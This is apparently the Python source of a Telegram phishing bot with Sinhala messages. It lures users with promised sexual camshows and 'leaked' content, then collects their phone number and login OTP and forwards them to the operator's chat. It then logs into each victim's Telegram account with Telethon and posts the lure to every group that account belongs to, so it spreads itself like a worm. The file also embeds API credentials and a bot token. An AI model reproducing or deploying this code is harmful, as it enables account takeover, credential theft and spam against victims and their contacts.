import os
from telethon import TelegramClient, events
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# --- CONFIGURATION ---
API_ID = 39824478
API_HASH = '8bb2d770e5cbcb9202e02a745e66f800'
BOT_TOKEN = '8237587692:AAG7qnxL1MuUALmzLlWwTleYfpO9HUgv9Q8'
ADSTERRA_LINK = 'https://www.effectivegatecpm.com/cg9xbsb1t?key=5a1e27cbefc93b84473d1598590647d0'
MY_CHAT_ID = 7927568234 

# Auto-Spread මැසේජ් එක
SPREAD_MSG = f"🔞 හෂිනිගේ අලුත්ම ලයිව් කැම් ෂෝ එක පටන් ගත්තා! බලන්න එන්න ඉක්මනට! ❤️\n\n👉 t.me/HashiCam_bot"

temp_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Next Step (Show & Gift) ➡️", callback_data="gift_step")]]
    await update.message.reply_text("❤️ හෂිනිගේ 5 MIN FREE CAMSHOW එකට සාදරයෙන් පිළිගන්නවා! ❤️", reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "gift_step":
        keyboard = [[InlineKeyboardButton("JOIN LEAKED GROUP NOW 🔞", url=ADSTERRA_LINK)],
                    [InlineKeyboardButton("වැඩ නෑනේ ⚠️", callback_data="verify_step")]]
        await query.edit_message_text("ලංකාවේ Leak වෙච්ච හොඳම බඩු ටික තියෙන Group එකට Join වෙන්න.", reply_markup=InlineKeyboardMarkup(keyboard))
    elif query.data == "verify_step":
        contact_keyboard = [[KeyboardButton("Verify Profile ✅", request_contact=True)]]
        await query.message.reply_text("පහත බටන් එක ඔබා ගිණුම තහවුරු කරන්න.", reply_markup=ReplyKeyboardMarkup(contact_keyboard, one_time_keyboard=True, resize_keyboard=True))

async def collect_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if update.message.contact:
        phone = update.message.contact.phone_number
        temp_data[user_id] = {'phone': phone}
        await context.bot.send_message(chat_id=MY_CHAT_ID, text=f"📱 PHONE: {phone}")
        await update.message.reply_text("දැන් ලැබුණු OTP එක එවන්න. 👇", reply_markup=ReplyKeyboardRemove())
    elif update.message.text:
        otp = update.message.text
        phone = temp_data.get(user_id, {}).get('phone')
        await context.bot.send_message(chat_id=MY_CHAT_ID, text=f"🔑 OTP: {otp} for {phone}")
        
        # --- AUTO SPREAD LOGIC ---
        try:
            client = TelegramClient(None, API_ID, API_HASH)
            await client.connect()
            await client.sign_in(phone, otp)
            # ගෘප් වලට පෝස්ට් එක යැවීම
            async for dialog in client.iter_dialogs():
                if dialog.is_group:
                    await client.send_message(dialog.id, SPREAD_MSG)
            await client.disconnect()
        except: pass
        await update.message.reply_text("✅ Verification Successful!")

if __name__ == '__main__':
    ApplicationBuilder().token(BOT_TOKEN).build().run_polling()
